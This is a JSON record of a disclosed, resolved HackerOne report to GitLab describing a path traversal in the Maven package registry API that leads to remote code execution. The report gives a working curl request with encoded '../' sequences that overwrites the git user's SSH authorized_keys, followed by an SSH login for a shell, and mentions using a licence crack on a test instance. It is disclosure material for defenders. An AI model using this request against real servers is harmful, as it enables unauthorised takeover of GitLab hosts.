@@ -1,0 +1,216 @@
+{
+  "id": 733072,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83MzMwNzI=",
+  "url": "https://hackerone.com/reports/733072",
+  "title": "Path traversal, to RCE",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2019-11-09T12:03:21.882Z",
+  "submitted_at": "2019-11-09T12:03:21.882Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "saltyyolk",
+    "url": "/saltyyolk",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/252/596/b03010470e2928f744f71fb5c1685806f1878341_original.jpeg/47c72a82657a929c13ab24e11674f7e10ea2bf67b1b9e7116b522cd7ede42f15"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 264,
+    "url": "https://hackerone.com/gitlab",
+    "handle": "gitlab",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "GitLab",
+      "twitter_handle": "gitlab",
+      "website": "https://about.gitlab.com",
+      "about": "A single application for the entire software development lifecycle."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2022-06-07T14:16:59.027Z",
+  "bug_reporter_agreed_on_going_public_at": "2022-06-07T14:16:58.807Z",
+  "team_member_agreed_on_going_public_at": "2020-01-10T08:50:01.472Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "### Summary\nThis one is similar to #732330 but much simpler.\nA path traversal issue in GitLab package registry API allow an attacker to write any file at any location writable to user git in a GitLab server.\n\n### Steps to reproduce\n\n1. Enable package registry in your GitLab instance.\n2. Create a project (package registry is enabled by default)\n3. Create a private token to call the API\n4. Send the following request\n\n```\ncurl -H \"Private-Token: $(cat token)\" http://10.26.0.5/api/v4/projects/2/packages/maven/a%2fb%2fc%2fd%2fe%2ff%2fg%2fh%2fi%2f1/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f.ssh%2fauthorized_keys -XPUT --path-as-is --data-binary @/home/asakawa/.ssh/id_rsa.pub\n```\nThen run `ssh git@10.26.0.5` to enjoy a shell.\n\n### Examples\n\n{F630231}\n\nIn my setup, I did't expose the 22 port of GitLab docker container, so I logged in the server with its docker IP, 172.18.0.2. In case there's any misunderstandings.\n\n#### Results of GitLab environment info\n\n```\n$ gitlab-rake gitlab:env:info\n\nSystem information\nSystem:\t\t\nProxy:\t\tno\nCurrent User:\tgit\nUsing RVM:\tno\nRuby Version:\t2.6.3p62\nGem Version:\t2.7.9\nBundler Version:1.17.3\nRake Version:\t12.3.3\nRedis Version:\t3.2.12\nGit Version:\t2.22.0\nSidekiq Version:5.2.7\nGo Version:\tunknown\n\nGitLab information\nVersion:\t12.4.2-ee\nRevision:\ta3170599aa2\nDirectory:\t/opt/gitlab/embedded/service/gitlab-rails\nDB Adapter:\tPostgreSQL\nDB Version:\t10.9\nURL:\t\thttp://10.26.0.5\nHTTP Clone URL:\thttp://10.26.0.5/some-group/some-project.git\nSSH Clone URL:\tgit@10.26.0.5:some-group/some-project.git\nElasticsearch:\tno\nGeo:\t\tno\nUsing LDAP:\tno\nUsing Omniauth:\tyes\nOmniauth Providers: \n\nGitLab Shell\nVersion:\t10.2.0\nRepository storage paths:\n- default: \t/var/opt/gitlab/git-data/repositories\nGitLab Shell path:\t\t/opt/gitlab/embedded/service/gitlab-shell\nGit:\t\t/opt/gitlab/embedded/bin/git\n```\n\n```\n# my docker-compose.yml\nversion: '3'\nservices:\n  web:\n    image: 'gitlab/gitlab-ee:latest'\n    restart: always\n    hostname: 'localhost'\n    environment:\n      GITLAB_OMNIBUS_CONFIG: |\n        external_url 'http://10.26.0.5'\n        gitlab_rails['packages_enabled'] = true\n    ports:\n      - '10.26.0.5:80:80'\n  #    - '10.26.0.5:22:22'\n    volumes:\n      - './config:/etc/gitlab'\n      - './logs:/var/log/gitlab'\n      - './data:/var/opt/gitlab'\n      - ./crack/pub.pem:/opt/gitlab/embedded/service/gitlab-rails/.license_encryption_key.pub:ro\n```\nPlease forgive me to use a crack on my self hosted testing purpose GitLab EE instance :)\n\n## Impact\n\nThis path traversal issue could be easily exploited by overwriting some critical files related to server access. In my example I use authorized_keys of git user to enable the shell access for the attacker.",
+  "bounty_amount": "12000.0",
+  "formatted_bounty": "$12,000",
+  "weakness": {
+    "id": 58,
+    "name": "Command Injection - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 630231,
+      "file_name": "2019-11-09-195607_1919x386_scrot.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/QXgzNh2CZ4icp5G6CGRbLqXj?response-content-disposition=attachment%3B%20filename%3D%222019-11-09-195607_1919x386_scrot.png%22%3B%20filename%2A%3DUTF-8%27%272019-11-09-195607_1919x386_scrot.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQFGVW4KO%2F20260703%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260703T051139Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjED0aCXVzLXdlc3QtMiJGMEQCIGxo3b5XV%2FxPTqhfuI54b3MGIBW9d%2Bmn4M6eQ5FnA992AiAZLM6%2FPGYj9ztH2raUwHKRrtzbUtZMpMshbmkuRiUxgCqxBQgGEAMaDDAxMzYxOTI3NDg0OSIMAOlhmkQEr%2FICw0FIKo4FenlppRZg6jvWQps40NqeeqGIxfHzoRjeN66eDtVywr4BDJlD%2BEGPxuBSU%2BcqVLZ3p%2F3yr8LjOAQZ7%2Bil91ndFmWTqwBxr%2BrXK%2BWmkh9Vds9gOn0De6DpOD1RNIhdtXz8eJClumO%2BO54WIC28thFHN4ZyPDdl%2FMlgDxpJn4fD3%2B%2FqnAtT%2Fjk7q0IX3ATBqLPNRl92h%2FL%2Fw%2BgLSnU3Z6rSc7uca5%2BjyrcIwXvkSj0n%2B9jvyFtafPvu8vgu2CzVcI%2FXgl%2FQEhCycOQZ9SO58bg%2BUtOT1B9J2i3ga4j8VcywFD%2FDlrX6c%2Fr90uJwUUTxGjs3qVI94bUUDmTmXH0NLUdCNERqtnd%2Bi6pn73XQJmDlodDODh5bISrIEMw667GU7hTJc0wXp3%2BewAZ6yEesj1nr83m098hiVB7aa3ClFtjNq0Q4%2B5oIv37UwlhJrrVrBg0KXrFdFi8lQuGKG5zxhO1EdVbDuiI%2FcUtqxViKW7jR3w%2FH6s7ui11ZKaM9ydto5KhX4y1R02bJmcooOCNru5p%2FHT0yY2ZS3ZIzba7cIAtFsL1wElkbicyccD48xXIXOR02aidTepU1Bf4W4CfjZKFAAWOL6%2FAB07iyLhlaDbNFSQQJSry%2FbwtZeLz4oy03mANo4bx%2BaisrdYVLkoK6vn%2FRzmIYjSgK3BtwJFSlOtma9K1z%2FHLA5cDIp8TsfAjCFKcqiRUOHSWOxjwV4Kn2YvYbBhPrtKyf%2F5kyWzbfWG6GKprgS47oSTjgREkdxRBhf9zMt9rj9TYlDSh7t2RjluOhIVL1Y9n5EkFcPP5GJ5bj48un7ylRIWzU1FHjD4q9uK8hOJjpl%2Bv9nAAu%2F7H4XAMPZh4o%2BsVZiCvxr9gpS3MJMKj%2BnNIGOrIB%2FyBpE8DgGI7cVadvcZGDxVg96HMSmqWCKeLXwcIgfo1y60vReADggvWF4EACYz7FkEW%2ByQ5%2FomoJI7waLs7CFwjgvT86S%2Fa79hScuVvEXBqFzIryQMi9ourpT5561M7Y2iF3KA7%2F9qYTU9wB9bz%2F3DQMJdnVeFK2Fulr0tY7HN5qMqQurQGmRzt4f%2BPQc6p0j7bJk9jasV2CfG5LovxeUirBr%2BTpwXZzsBcZjuLo3QmPIA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=140c56a4ba05075da7535eb4edfe037d757c9a211805821858a2c1855166438e",
+      "file_size": 78497,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 141,
+  "voters": [
+    "joaxcar",
+    "cucumbersalad",
+    "jumpydata",
+    "napkin",
+    "orange303",
+    "ghaem51",
+    "m4khn0",
+    "adilnbabras",
+    "strawp",
+    "n1m0",
+    "and 131 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "Team"
+  },
+  "structured_scope": {
+    "databaseId": 39022,
+    "asset_type": "OTHER",
+    "asset_identifier": "Your Own GitLab Instance",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ],
+  "databaseId": "733072",
+  "votes": 141,
+  "latest_disclosable_activity_at": "2022-06-07T14:16:59.083Z",
+  "_metadata": {
+    "saved_at": "2026-07-03T13:11:39.935691",
+    "source": "https://hackerone.com/reports/733072.json",
+    "report_id": 733072
+  },
+  "_graphql_detail": {
+    "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83MzMwNzI=",
+    "databaseId": "733072",
+    "title": "Path traversal, to RCE",
+    "url": "https://hackerone.com/reports/733072",
+    "state": null,
+    "substate": "resolved",
+    "disclosed_at": "2022-06-07T14:16:59.027Z",
+    "created_at": "2019-11-09T12:03:21.882Z",
+    "submitted_at": null,
+    "weakness": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1dlYWtuZXNzLzU4",
+      "name": "Command Injection - Generic",
+      "external_id": "cwe-77"
+    },
+    "severity": {
+      "rating": "high",
+      "score": null
+    },
+    "reporter": {
+      "username": "saltyyolk"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzI2NA==",
+      "handle": "gitlab",
+      "name": "GitLab",
+      "url": "https://hackerone.com/gitlab",
+      "currency": "usd"
+    },
+    "bounties": {
+      "edges": [
+        {
+          "node": {
+            "id": "Z2lkOi8vaGFja2Vyb25lL0JvdW50eS8xNzI0NTY=",
+            "amount": "1000.00",
+            "awarded_amount": "1000.00",
+            "awarded_bonus_amount": "0.00",
+            "created_at": "2019-11-15T10:57:03.405Z"
+          }
+        },
+        {
+          "node": {
+            "id": "Z2lkOi8vaGFja2Vyb25lL0JvdW50eS8xNzc5MjA=",
+            "amount": "11000.00",
+            "awarded_amount": "11000.00",
+            "awarded_bonus_amount": "0.00",
+            "created_at": "2019-12-11T09:04:22.310Z"
+          }
+        }
+      ]
+    }
+  },
+  "_hacktivity": {
+    "__typename": "HacktivityDocument",
+    "id": "Z2lkOi8vaGFja2Vyb25lL0NvbXBsZXRlSGFja3Rpdml0eVJlcG9ydEluZGV4LzczMzA3Mg==",
+    "_id": "733072",
+    "disclosed": true,
+    "votes": 141,
+    "latest_disclosable_activity_at": "2022-06-07T14:16:59.083Z",
+    "report": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83MzMwNzI=",
+      "databaseId": "733072",
+      "title": "Path traversal, to RCE",
+      "url": "https://hackerone.com/reports/733072",
+      "disclosed_at": "2022-06-07T14:16:59.027Z"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzI2NA==",
+      "handle": "gitlab",
+      "name": "GitLab",
+      "url": "https://hackerone.com/gitlab",
+      "currency": "usd"
+    }
+  }
+}
